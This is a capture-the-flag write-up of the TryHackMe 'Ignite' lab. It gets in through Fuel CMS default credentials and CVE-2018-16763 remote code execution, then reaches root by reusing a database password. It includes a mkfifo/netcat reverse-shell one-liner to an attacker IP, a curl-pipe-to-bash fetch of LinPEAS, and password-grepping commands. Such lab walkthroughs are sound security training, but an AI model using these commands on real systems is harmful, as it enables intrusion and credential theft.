# Ignite - TryHackMe

> **Kill Chain Summary**: Identify Fuel CMS version 1.4 running on Apache HTTP port 80, authenticate to the `/fuel/` administrative panel using default credentials (`admin:admin`), and leverage an unauthenticated remote code execution vulnerability (`CVE-2018-16763`) to execute commands on the server. Upgrade the pseudo-shell to an interactive reverse shell as `www-data` using a `mkfifo` pipe, deploy LinPEAS to inspect application configuration files, extract cleartext database credentials (`mememe`) from `/var/www/html/fuel/application/config/database.php`, and reuse this password via `su root` to achieve instant root access.

| Property | Value |
| --- | --- |
| **Target Name** | Ignite |
| **Platform** | TryHackMe |
| **OS** | Linux (Ubuntu) |
| **Difficulty** | Easy |
| **Status** | Rooted |
| **Key Techniques** | Fuel CMS 1.4 Default Credentials, Fuel CMS Remote Code Execution (CVE-2018-16763), Reverse Shell Stabilization (mkfifo / PTY), LinPEAS Configuration Enumeration, Hardcoded Database Credentials Reuse |

---

## 1. Reconnaissance and Enumeration

### TCP Port Scanning

A full TCP port scan was performed to enumerate all listening network services on the target:

```bash
sudo nmap -sC -sV -p- -T4 -oA nmap/full_tcp_$IP $IP
```

**Port Scan Results:**

| Port | Service | Version / Details | Operational Role |
| --- | --- | --- | --- |
| **80/tcp** | http | Apache httpd 2.4.18 ((Ubuntu)) | Web Application Server |

### Web Application Enumeration (Port 80)

Navigating to `http://$IP` presents the default landing page for **FUEL CMS version 1.4**.

Inspecting `/robots.txt`:

```text
User-agent: *
Disallow: /fuel/
```

Navigating to `http://$IP/fuel/` displayed the administrative login portal. Standard default credentials documented for FUEL CMS were evaluated:

- **Username**: `admin`
- **Password**: `admin`

Authentication succeeded, granting administrative access to the FUEL CMS dashboard.

---

## 2. Initial Access

### Exploiting Fuel CMS 1.4 Remote Code Execution (CVE-2018-16763)

Fuel CMS version 1.4 suffers from an unauthenticated remote code execution vulnerability (`CVE-2018-16763`) in its `pages/select` controller. The vulnerability occurs because the `filter` parameter is improperly sanitized and evaluated directly by PHP functions.

An automated exploit script was executed to interact with the target:

```bash
python3 exploit.py -u http://$IP/
```

The script established a pseudo-command execution shell over HTTP GET requests:

```text
Enter Command $ whoami
www-data
```

### Shell Upgrading and Stabilization

Because HTTP pseudo-shells lack interactive terminal capabilities and job control, a dedicated reverse shell was spawned using a FIFO named pipe:

```bash
# On Kali:
nc -lvnp 4444
```

```text
# Inside exploit pseudo-shell:
Enter Command $ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 192.168.129.253 4444 >/tmp/f
```

The Netcat listener caught the incoming reverse shell:

```bash
connect to [192.168.129.253] from (UNKNOWN) [10.129.182.236] 41288
whoami
www-data
```

The shell was stabilized with Python PTY:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
```

The user flag was retrieved:

```bash
cat /home/www-data/flag.txt
[FLAG REDACTED]
```

---

## 3. Privilege Escalation

### Local System Enumeration

To audit the system for privilege escalation vectors, `linpeas.sh` was transferred and executed:

```bash
# On Kali:
python3 -m http.server 8000

# On target:
curl http://192.168.129.253:8000/linpeas.sh | bash
```

LinPEAS flagged cleartext database credentials embedded within the application configuration file:

```text
/var/www/html/fuel/application/config/database.php:
    'hostname' => 'localhost',
    'username' => 'root',
    'password' => 'mememe',
    'database' => 'fuel_schema',
    'dbdriver' => 'mysqli',
```

The database configuration revealed the password `mememe` assigned to user `root`.

### Credential Reuse for Root Privilege Escalation

In Linux environments, database administrative passwords are frequently reused for the local system `root` account.

Switching user to `root` with the recovered credential:

```bash
su root
# Password: mememe
```

Authentication succeeded immediately:

```bash
root@ignite:/var/www/html# id
uid=0(root) gid=0(root) groups=0(root)
root@ignite:/var/www/html# whoami
root
```

The root flag was retrieved:

```bash
cat /root/root.txt
[FLAG REDACTED]
```

---

## 4. Useful Commands Summary

```bash
# Exploiting Fuel CMS CVE-2018-16763
python3 exploit.py -u http://TARGET_IP/

# Spawning a FIFO Named Pipe Reverse Shell
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc ATTACKER_IP PORT >/tmp/f

# Stabilizing Interactive Shell
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm

# Searching for Passwords in Configuration Files
grep -ri "password" /var/www/html/ 2>/dev/null | grep -v "example"
```

---

## 5. Key Takeaways and Lessons Learned

1. **Verify Default Credentials First**:
   Whenever standard Content Management Systems or web administrative portals are identified, default credentials (`admin:admin`, `root:root`, `admin:password`) should always be tested before executing complex exploits.

2. **Upgrading Pseudo-Shells to Full TTYs**:
   Many public exploits return pseudo-shells operating through repeated HTTP requests. These shells do not support terminal interaction, job control, or background processes. Immediately upgrading to a native reverse shell (via `mkfifo`, bash TCP, or socat) is required before running auditing utilities.

3. **Auditing Local Database Configuration Files**:
   Local application configuration files (`database.php`, `wp-config.php`, `config.inc.php`, `.env`) are primary sources of high-value credentials. Passwords discovered in configuration files must immediately be tested across all local system accounts and `root`.

---

#thm #linux #ubuntu #fuel-cms #cve-2018-16763 #default-credentials #cleartext-password #credential-reuse #linpeas #easy
